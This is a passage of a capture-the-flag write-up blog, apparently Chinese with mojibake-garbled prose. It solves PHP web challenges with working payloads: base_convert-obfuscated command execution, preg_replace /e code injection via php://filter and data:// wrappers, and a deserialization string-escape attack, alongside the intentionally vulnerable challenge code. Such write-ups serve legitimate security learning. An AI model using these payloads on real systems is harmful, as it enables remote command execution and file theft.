punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token variable">$log</span><span class="token punctuation">{</span>pi<span class="token punctuation">}</span><span class="token punctuation">(</span>$<span class="token variable">$log</span><span class="token punctuation">{</span>abs<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>abs<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°flag</p><h3 id="è§£æ³•äºŒï¼š"><a href="#è§£æ³•äºŒï¼š" class="headerlink" title="è§£æ³•äºŒï¼š"></a>è§£æ³•äºŒï¼š</h3><p>getallheaders()å‡½æ•°ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$headers</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$headers: $value"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å‡½æ•°çš„è¿”å›å€¼æ˜¯ä»¥æ•°ç»„çš„å½¢å¼è¿”å›ï¼ŒåŒæ—¶è¿”å›å€¼å°±æ˜¯è¯·æ±‚åŒ…é‡Œé¢çš„æ•°æ®</p><p>payloadï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$log</span><span class="token operator">=</span>base_convert<span class="token punctuation">;</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">=</span> exec<span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">=</span> getallheaders<span class="token function">exec</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$log</span><span class="token operator">=</span>base_convert<span class="token punctuation">;</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">696468</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡ŒåŒæ ·ä½¿ç”¨èŠ±æ‹¬å·æ¥ä»£æ›¿ä¸­æ‹¬å·ï¼Œç„¶ååˆ©ç”¨getallheaderså‡½æ•°æ¥è¯»å–é”®åä¸º1çš„valueï¼Œä¹Ÿå°±æ˜¯cat /flagï¼Œè¿™ä¸ªéœ€è¦æ‰‹åŠ¨åœ¨è¯·æ±‚åŒ…é‡Œé¢è‡ªä¸»æ·»åŠ ï¼Œç„¶ååˆ©ç”¨execæ¥å®ç°å‘½ä»¤æ‰§è¡Œ</p><h1 id="2021-06-06"><a href="#2021-06-06" class="headerlink" title="2021-06-06"></a>2021-06-06</h1><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><h3 id="é¢˜ç›®ï¼š-1"><a href="#é¢˜ç›®ï¼š-1" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//next.php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æƒ³è¦å®ç°æ–‡ä»¶è¯»å–æ¼æ´å°±éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><pre><code>?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></pre><p>è¯»å–åˆ°nextæºç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ‰«ç›²ï¼š-2"><a href="#æ‰«ç›²ï¼š-2" class="headerlink" title="æ‰«ç›²ï¼š"></a>æ‰«ç›²ï¼š</h3><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replaceä¸ä»£ç æ‰§è¡Œ</a></p><p><a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-metachar.html" target="_blank" rel="noopener">æ­£åˆ™è¡¨è¾¾å¼ â€“ å…ƒå­—ç¬¦_w3cschool</a>ï¼šè¿™é‡Œä¸»è¦æ¶‰åŠçš„å…ƒå­—ç¬¦ä¸º\Sæ„æ€ä¸ºåŒ¹é…æ‰€æœ‰çš„éç©ºå­—ç¬¦</p><p>åŒæ—¶è¿˜æ¶‰åŠåˆ°å˜é‡è¦†ç›–çš„ä¸¤ç§å½¢å¼ï¼š<code>$$aæˆ–è€…${$a},ä¸¤ç§å˜é‡è¦†ç›–çš„å½¢å¼æ˜¯ä¸ºäº†é¿å…æ­§ä¹‰ï¼Œå½“éœ€è¦ä½¿ç”¨å˜é‡è¦†ç›–æ¥ç”¨äºæ•°ç»„çš„æ—¶å€™ç¬¬ä¸€ç§ä¸ºï¼š${$a[1]}ã€ç¬¬äºŒç§ï¼š${$a}[1]</code></p><h3 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h3><p>1.é¦–å…ˆä½ éœ€è¦çŸ¥é“å…³äºå˜é‡è¦†ç›–ï¼Œä»¥åŠåŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¼šè¢«phpè§£æå™¨è§£æåæ‰§è¡Œã€‚</p><p>æœ¬åœ°è¯•éªŒï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"${phpinfo()}"</span><span class="token punctuation">;</span><span class="token shell-comment comment">#ä¼šè¢«æ‰§è¡Œ</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'${phpinfo()}'</span><span class="token punctuation">;</span><span class="token shell-comment comment">#ä¸ä¼šè¢«æ‰§è¡Œ</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2.å…³äº\1çš„é—®é¢˜ï¼Œå°±æ˜¯å°†ä½ é€šè¿‡åœ†æ‹¬å·æŒ‡å®šçš„åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²ä¼šè¢«æš‚æ—¶å‚¨å­˜åœ¨ä¸€ä¸ªç¼“å†²åŒºé‡Œé¢ï¼Œè€Œ\1å°±æ˜¯è¯»ä½ ç¬¬ä¸€ä¸ªåœ†æ‹¬å·æŒ‡å®šåŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</p><p>æœ¬åœ°è¯•éªŒï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"abc123456789"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/(\S)(\S)(\S)(\S)/i'</span><span class="token punctuation">,</span><span class="token string">'strtolower("\\0")'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\S)(\S)(\S)(\S)/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å›ç»“æœä¸ºï¼š</p><p>strtolower(â€œabc1â€)strtolower(â€œ2345â€)strtolower(â€œ6789â€)</p><p>Array ( [0] =&gt; abc1 [1] =&gt; a [2] =&gt; b [3] =&gt; c [4] =&gt; 1 )</p><p>è¿™é‡Œç‰µæ‰¯åˆ°ä¸€ä¸ª<a href="https://www.jb51.net/article/30645.htm" target="_blank" rel="noopener">phpæ­£åˆ™è¡¨è¾¾å¼çš„å­æ¨¡å¼</a></p><h3 id="è§£é¢˜ï¼š-1"><a href="#è§£é¢˜ï¼š-1" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> \<span class="token package">S</span><span class="token operator">+</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        $<span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´è¦ä¼ å…¥çš„å‚æ•°ä¸ºï¼š</p><pre><code>?\S%2b=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;);</code></pre><h1 id="2021-06-08"><a href="#2021-06-08" class="headerlink" title="2021-06-08"></a>2021-06-08</h1><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><h3 id="é¢˜ç›®ï¼š-2"><a href="#é¢˜ç›®ï¼š-2" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ‰«ç›²ï¼š-3"><a href="#æ‰«ç›²ï¼š-3" class="headerlink" title="æ‰«ç›²ï¼š"></a>æ‰«ç›²ï¼š</h3><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">PHP extract() å‡½æ•°</a>ï¼šä»æ•°ç»„ä¸­é”®åå˜ä¸ºå˜é‡åï¼Œé”®å€¼ä¸ºå˜é‡å€¼</p><p><a href="https://www.runoob.com/php/php-unset-function.html" target="_blank" rel="noopener">PHP unset() å‡½æ•°</a>ï¼šé”€æ¯ç»™å®šçš„å˜é‡</p><h3 id="è§£é¢˜ï¼š-2"><a href="#è§£é¢˜ï¼š-2" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><h4 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h4><p>$functionçš„ç¬¬äºŒä¸ªé€‰é¡¹</p><pre><code>?f=phpinfo</code></pre><p>ä¼šå¾—åˆ°ï¼šd0g3_f1ag.php</p><p>æƒ³è¦å®ç°d0g3_f1ag.phpçš„è¯»å–å°±è¦ä¿è¯$function=show_imageï¼Œç„¶åé€šè¿‡å°†$serialize_infoçš„ååºåˆ—åŒ–ï¼Œæ¥èµ‹äºˆ$userinfoçš„å€¼ï¼Œè€Œ$serialize_infoæ˜¯ç”±$_SESSIONå…ˆç»è¿‡åºåˆ—åŒ–ç„¶åç»è¿‡å‡½æ•°filterçš„è¿‡æ»¤åçš„å€¼ã€‚</p><p>æ‰€ä»¥è¿™é‡Œçš„$_SESSIONä¸­å­˜åœ¨</p><pre><code>$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);</code></pre><p>ä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„æ˜¯å°†imgçš„åºåˆ—åŒ–å€¼ç»™é¡¶å‡ºå»ï¼Œæ‰€ä»¥å°±æ¶‰åŠåˆ°äº†phpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸é—®é¢˜ï¼Œæœ¬åœ°æ„é€ åºåˆ—åŒ–å€¼ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Yn8rt'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°ï¼š</p><pre class="line-numbers language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"guest"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"Yn8rt"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶è€Œæˆ‘ä»¬éœ€è¦çš„d0g3_f1ag.php(ZDBnM19mMWFnLnBocA==)å¹¶ä¸ä¼šè¢«è¯»å–ï¼Œæ‰€ä»¥æƒ³åŠæ³•å°†imgå˜æˆæˆ‘ä»¬å¯æ§çš„ï¼š</p><p>é¦–å…ˆï¼šuseré‚£ä¹ˆå¯ä»¥æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»–ï¼Œé€šè¿‡è¿‡æ»¤æœºåˆ¶æ¥å®ç°è®©åºåˆ—åŒ–å€¼ç¼©çŸ­ï¼Œç„¶åè®©å›ºå®šçš„å€¼ï¼ˆimgï¼‰å˜æˆæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å€¼</p><p>å…¶æ¬¡ï¼šfunctionæˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œæ‰€ä»¥éœ€è¦functionä¼ å…¥çš„å‚æ•°ä¸ºï¼š</p><pre><code>Yn8rt&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></pre><p>ä¸ºäº†è®©å›ºå®šçš„è¢«æŒ¤å‡ºå»ï¼Œæˆ‘ä»¬éœ€è¦å†æ„é€ ä¸€ä¸ªæ•°ç»„ä¸­çš„å‚æ•°æ¥æ›¿ä»£åŸæ¥çš„imgï¼ŒåŒæ—¶æˆ‘ä»¬åœ¨gueståé¢å­˜åœ¨28ä¸ªå­—ç¬¦æ‰€ä»¥æ„é€ çš„userè¦æœ‰28ä¸ªéæ³•å­—ç¬¦ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'flagphpflagphpflagphpflagphp'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Yn8rt";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span 